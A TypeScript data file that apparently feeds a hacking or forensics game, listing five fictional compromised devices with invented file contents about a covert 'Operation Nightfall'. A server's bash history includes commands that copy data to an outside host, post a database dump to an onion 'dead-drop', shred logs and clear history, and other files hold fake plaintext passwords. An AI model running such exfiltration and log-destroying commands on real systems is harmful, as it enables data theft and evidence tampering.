export interface FileNode {
  name: string;
  type: 'file' | 'dir';
  content?: string;
  children?: FileNode[];
}

export interface InfectedDevice {
  ip: string;
  type: string;
  os: string;
  fs: FileNode;
}

export const infectedDevices: InfectedDevice[] = [
  {
    ip: '192.168.1.104',
    type: 'Unknown Mobile Device',
    os: 'Android 14',
    fs: {
      name: 'root',
      type: 'dir',
      children: [
        {
          name: 'Storage', type: 'dir', children: [
            {
              name: 'Image', type: 'dir', children: [
                { name: 'IMG_20231015.jpg', type: 'file', content: '[BINARY] JPEG Image — 3.2MB — Foto lokasi pertemuan, GPS: -6.2088, 106.8456' },
                { name: 'screenshot_wa.png', type: 'file', content: '[BINARY] PNG Screenshot — 1.1MB — WhatsApp chat with "BOSS"' },
                { name: 'selfie_malam.jpg', type: 'file', content: '[BINARY] JPEG Image — 2.8MB — Selfie di lokasi gelap, timestamp: 2023-10-15 22:41' }
              ]
            },
            {
              name: 'Chat', type: 'dir', children: [
                { name: 'backup_wa.db', type: 'file', content: 'SQLite format 3... [Encrypted WhatsApp backup — 45MB]' },
                {
                  name: 'secret_convo.txt', type: 'file',
                  content: '[2023-10-14 23:15] BOSS: Target is moving tonight.\n[2023-10-14 23:16] ME: Copy. Unit ready at checkpoint.\n[2023-10-14 23:18] BOSS: Make sure no traces. Delete after reading.\n[2023-10-14 23:19] ME: Understood. Going dark.\n[2023-10-15 01:42] ME: Package secured. Returning to base.\n[2023-10-15 01:43] BOSS: Good. Destroy the phone after this.'
                },
                {
                  name: 'group_chat.txt', type: 'file',
                  content: '[Group: Tim Operasi Malam]\n[2023-10-12] Andi: Jadwal sudah dikonfirmasi\n[2023-10-12] Budi: Rute 2 lebih aman\n[2023-10-13] Citra: Peralatan sudah siap\n[2023-10-14] Andi: Kumpul jam 10 malam, titik biasa'
                }
              ]
            },
            {
              name: 'Download', type: 'dir', children: [
                { name: 'invoice_hotel.pdf', type: 'file', content: '[PDF] Hotel Grand Mercure, Room 1408\nCheck-in: 2023-10-14 | Check-out: 2023-10-16\nGuest: John Doe (alias)\nPayment: Cash — Rp 2.500.000' },
                { name: 'ticket_pesawat.pdf', type: 'file', content: '[PDF] Lion Air — Passenger: JOHN DOE\nRoute: CGK → UPG (Jakarta → Makassar)\nDate: 2023-10-18 | Booking: XK7M2P' }
              ]
            },
            {
              name: 'Documents', type: 'dir', children: [
                { name: 'catatan_pribadi.txt', type: 'file', content: 'Catatan:\n- Meeting lokasi baru: Jl. Sudirman No. 47\n- Password wifi safe house: nighthawk2023\n- Kontak darurat: 0812-XXXX-7788 (kode "Elang")' },
                { name: 'password_list.txt', type: 'file', content: 'email: j0hndoe@protonmail.com / D4rkN1ght!2023\nbank: johndoe / TrustNo1$$\nvpn: jdoe_anon / Str0ngP@ss99\nserver: root / n1ghtm4r3_2023' }
              ]
            }
          ]
        },
        {
          name: 'System', type: 'dir', children: [
            { name: 'build.prop', type: 'file', content: 'ro.product.model=SM-S918B\nro.product.brand=samsung\nro.build.version.sdk=34\nro.build.type=user' },
            {
              name: 'logs', type: 'dir', children: [
                { name: 'system.log', type: 'file', content: '[00:12:33] INFO: Location services enabled\n[00:12:34] WARN: VPN connection established\n[01:30:15] INFO: Camera accessed by com.whatsapp\n[01:42:07] WARN: USB debugging enabled\n[02:15:44] ERROR: Unauthorized root access detected' },
                { name: 'crash.log', type: 'file', content: 'FATAL EXCEPTION: main\nProcess: com.secure.messenger, PID: 12847\njava.lang.SecurityException: Permission denied\n  at com.secure.messenger.CryptoEngine.decrypt(CryptoEngine.java:142)' }
              ]
            }
          ]
        }
      ]
    }
  },
  {
    ip: '192.168.1.112',
    type: 'Windows PC',
    os: 'DESKTOP-8A9F',
    fs: {
      name: 'root', type: 'dir', children: [
        {
          name: 'Users', type: 'dir', children: [
            {
              name: 'Admin', type: 'dir', children: [
                {
                  name: 'Desktop', type: 'dir', children: [
                    { name: 'notes.txt', type: 'file', content: 'TODO:\n- Transfer dana ke rekening offshore\n- Hapus log server jam 3 pagi\n- Meeting dengan klien X di lokasi biasa\n- Ganti semua password sebelum akhir bulan' },
                    { name: 'financial_records.xlsx', type: 'file', content: '[BINARY] Excel Spreadsheet — Contains offshore transaction records\nTotal transfers: Rp 15.7 Billion across 12 accounts\nLast modified: 2023-10-13' }
                  ]
                },
                {
                  name: 'Documents', type: 'dir', children: [
                    { name: 'project_plan.docx', type: 'file', content: '[BINARY] Word Document — Operation Nightfall\nPhase 1: Reconnaissance (Complete)\nPhase 2: Infiltration (In Progress)\nPhase 3: Extraction (Pending)\nDeadline: 2023-10-20' },
                    { name: 'meeting_notes.txt', type: 'file', content: 'Meeting 2023-10-10:\nAttendees: Alpha, Bravo, Charlie\n- Route confirmed through south entrance\n- Backup plan if primary fails\n- Payment will be in crypto\n- Next meeting: Oct 15, 2200 hours' }
                  ]
                },
                {
                  name: '.ssh', type: 'dir', children: [
                    { name: 'id_rsa', type: 'file', content: '-----BEGIN OPENSSH PRIVATE KEY-----\nb3BlbnNzaC1rZXktdjEAAAAACmFlczI1Ni1jdHIA\nAAAABGJjcnlwdAAAABgAAABBI5kOFOb+QMAAAAEA\n[REDACTED — Private key for server access]\n-----END OPENSSH PRIVATE KEY-----' },
                    { name: 'known_hosts', type: 'file', content: '192.168.1.87 ssh-rsa AAAAB3NzaC1yc2EAAAA...\n45.33.32.156 ssh-ed25519 AAAAC3NzaC1lZDI1NTE5...' }
                  ]
                }
              ]
            }
          ]
        },
        {
          name: 'ProgramData', type: 'dir', children: [
            {
              name: 'logs', type: 'dir', children: [
                { name: 'access.log', type: 'file', content: '[2023-10-14 22:00] Login: Admin — IP: 192.168.1.112\n[2023-10-14 22:15] File accessed: financial_records.xlsx\n[2023-10-14 23:30] USB device connected: SanDisk 64GB\n[2023-10-15 00:05] File copied to USB: project_plan.docx\n[2023-10-15 00:10] USB device removed' },
                { name: 'vpn_config.ovpn', type: 'file', content: 'client\ndev tun\nproto udp\nremote 45.33.32.156 1194\ncipher AES-256-CBC\nauth SHA512\nresolv-retry infinite\nnobind\npersist-key\npersist-tun' }
              ]
            }
          ]
        }
      ]
    }
  },
  {
    ip: '192.168.1.205',
    type: 'Smart Home Camera',
    os: 'IoT_Cam_v2',
    fs: {
      name: 'root', type: 'dir', children: [
        {
          name: 'Storage', type: 'dir', children: [
            {
              name: 'Video', type: 'dir', children: [
                { name: 'cam_rec_001.mp4', type: 'file', content: '[BINARY] MP4 Video — 12MB — 2023-10-14 21:00-21:30\nMotion detected: 2 persons entering building' },
                { name: 'cam_rec_002.mp4', type: 'file', content: '[BINARY] MP4 Video — 8MB — 2023-10-15 01:15-01:25\nMotion detected: 1 person carrying large bag, face obscured' },
                { name: 'cam_rec_suspicious.mp4', type: 'file', content: '[BINARY] MP4 Video — 22MB — 2023-10-15 01:40-02:10\nALERT: Multiple persons, vehicle plate: B 1234 XYZ' }
              ]
            }
          ]
        },
        {
          name: 'config', type: 'dir', children: [
            { name: 'camera.conf', type: 'file', content: 'resolution=1080p\nfps=30\nnight_vision=enabled\nmotion_sensitivity=high\nrecording_mode=motion_trigger\nstorage_limit=64GB' },
            { name: 'network.conf', type: 'file', content: 'ssid=HOME_NETWORK_5G\nip=192.168.1.205\ngateway=192.168.1.1\ndns=8.8.8.8\nport_rtsp=554\nport_http=80\nadmin_password=admin123' }
          ]
        },
        {
          name: 'logs', type: 'dir', children: [
            { name: 'access.log', type: 'file', content: '[2023-10-14 20:00] Stream started — client: 192.168.1.112\n[2023-10-14 21:00] Motion detected — zone: entrance\n[2023-10-15 01:15] Motion detected — zone: parking\n[2023-10-15 01:40] ALERT: Extended motion — zone: all\n[2023-10-15 02:15] Stream ended — client: 192.168.1.112' },
            { name: 'motion_detect.log', type: 'file', content: '2023-10-15 01:15:03 | Zone: parking | Confidence: 94%\n2023-10-15 01:15:18 | Zone: entrance | Confidence: 87%\n2023-10-15 01:40:22 | Zone: parking | Confidence: 98%\n2023-10-15 01:41:05 | Zone: entrance | Confidence: 96%\n2023-10-15 01:55:33 | Zone: backyard | Confidence: 91%' }
          ]
        }
      ]
    }
  },
  {
    ip: '192.168.1.87',
    type: 'Linux Server',
    os: 'Ubuntu 22.04 LTS',
    fs: {
      name: 'root', type: 'dir', children: [
        {
          name: 'var', type: 'dir', children: [
            {
              name: 'www', type: 'dir', children: [
                {
                  name: 'html', type: 'dir', children: [
                    { name: 'index.html', type: 'file', content: '<!DOCTYPE html>\n<html><head><title>Under Maintenance</title></head>\n<body><h1>Site Temporarily Unavailable</h1></body></html>' },
                    { name: '.htaccess', type: 'file', content: 'RewriteEngine On\nRewriteCond %{REQUEST_URI} ^/admin\nRewriteRule ^(.*)$ /maintenance.html [R=302,L]' }
                  ]
                }
              ]
            },
            {
              name: 'log', type: 'dir', children: [
                { name: 'auth.log', type: 'file', content: 'Oct 14 22:00:01 server sshd: Accepted publickey for admin from 192.168.1.112\nOct 14 23:45:12 server sshd: Failed password for root from 103.45.67.89\nOct 14 23:45:15 server sshd: Failed password for root from 103.45.67.89\nOct 15 00:00:03 server CRON: (root) CMD (/usr/local/bin/cleanup.sh)\nOct 15 01:30:00 server sshd: Accepted publickey for admin from 192.168.1.112' },
                { name: 'syslog', type: 'file', content: 'Oct 15 00:00:01 server systemd: Started Daily apt upgrade\nOct 15 00:00:03 server cleanup.sh: Removing logs older than 7 days\nOct 15 00:00:03 server cleanup.sh: WARNING — 14 files deleted from /tmp\nOct 15 01:30:05 server sshd: session opened for user admin' }
              ]
            }
          ]
        },
        {
          name: 'etc', type: 'dir', children: [
            { name: 'passwd', type: 'file', content: 'root:x:0:0:root:/root:/bin/bash\nadmin:x:1000:1000:Admin:/home/admin:/bin/bash\nwww-data:x:33:33:www-data:/var/www:/usr/sbin/nologin\nmysql:x:27:27:MySQL:/var/lib/mysql:/bin/false' },
            { name: 'shadow', type: 'file', content: '[ACCESS DENIED — Encrypted password hashes]\nroot:$6$rounds=656000$xyz...::0:99999:7:::\nadmin:$6$rounds=656000$abc...::0:99999:7:::' },
            { name: 'crontab', type: 'file', content: '# m h dom mon dow command\n0 0 * * * /usr/local/bin/cleanup.sh\n*/5 * * * * /usr/local/bin/heartbeat.sh\n0 3 * * * /usr/local/bin/backup.sh --silent --no-log' }
          ]
        },
        {
          name: 'home', type: 'dir', children: [
            {
              name: 'admin', type: 'dir', children: [
                { name: '.bash_history', type: 'file', content: 'ssh admin@192.168.1.112\nscp financial_records.xlsx admin@45.33.32.156:/tmp/\nshred -vfz -n 5 /var/log/auth.log\nmysqldump -u root -p nightdb > /tmp/dump.sql\ncurl -X POST https://dead-drop.onion/upload -F "file=@/tmp/dump.sql"\nrm -rf /tmp/dump.sql\nhistory -c' },
                { name: 'cleanup.sh', type: 'file', content: '#!/bin/bash\n# Automated evidence cleanup\nfind /var/log -name "*.log" -mtime +7 -delete\nfind /tmp -type f -mtime +1 -delete\necho "Cleanup completed at $(date)" >> /var/log/cleanup.log' }
              ]
            }
          ]
        }
      ]
    }
  },
  {
    ip: '192.168.1.150',
    type: 'Network Storage (NAS)',
    os: 'Synology DSM 7.2',
    fs: {
      name: 'root', type: 'dir', children: [
        {
          name: 'shared', type: 'dir', children: [
            {
              name: 'backups', type: 'dir', children: [
                { name: 'db_backup_20231014.sql.gz', type: 'file', content: '[BINARY] Compressed SQL dump — 128MB\nDatabase: nightdb | Tables: 47 | Records: 1.2M' },
                { name: 'full_backup_oct.tar.gz', type: 'file', content: '[BINARY] Full system backup — 4.7GB\nIncludes: /home, /etc, /var/www\nCreated: 2023-10-14 03:00' }
              ]
            },
            {
              name: 'documents', type: 'dir', children: [
                { name: 'operasi_detail.txt', type: 'file', content: 'OPERATION NIGHTFALL — CLASSIFIED\n\nObjective: Extract target from location Alpha\nDate: 2023-10-15\nTeam: 4 operatives\nTransport: Black SUV — B 1234 XYZ\nExfil point: Marina Bay dock 7\nBackup: Helicopter at helipad H-3\n\nCONTINGENCY: If compromised, destroy all devices and scatter.' },
                { name: 'contacts_encrypted.gpg', type: 'file', content: '[GPG ENCRYPTED] — Requires passphrase to decrypt\nEncryption: AES256\nRecipient: alpha@nightops.onion' }
              ]
            },
            {
              name: 'evidence', type: 'dir', children: [
                { name: 'photo_evidence_01.jpg', type: 'file', content: '[BINARY] JPEG — Target entering warehouse at 01:15\nCamera: South entrance, Night vision enhanced' },
                { name: 'audio_recording.m4a', type: 'file', content: '[BINARY] M4A Audio — 4min 23sec\nTranscript excerpt: "...the shipment arrives at midnight... make sure the guards are handled..."' },
                { name: 'transaction_log.csv', type: 'file', content: 'date,from,to,amount,currency,note\n2023-09-01,ACC-001,ACC-OFF-12,500000000,IDR,phase1\n2023-09-15,ACC-001,ACC-OFF-12,750000000,IDR,phase2\n2023-10-01,ACC-OFF-12,ACC-CRYPTO,1250000000,IDR,conversion\n2023-10-10,ACC-CRYPTO,WALLET-X,15.5,BTC,final' }
              ]
            }
          ]
        },
        {
          name: 'system', type: 'dir', children: [
            { name: 'config.json', type: 'file', content: '{\n  "hostname": "NAS-BACKUP-01",\n  "raid_level": "RAID5",\n  "total_storage": "16TB",\n  "used": "7.3TB",\n  "encryption": "AES-256",\n  "remote_access": true,\n  "ddns": "nas-backup.synology.me"\n}' }
          ]
        }
      ]
    }
  }
];
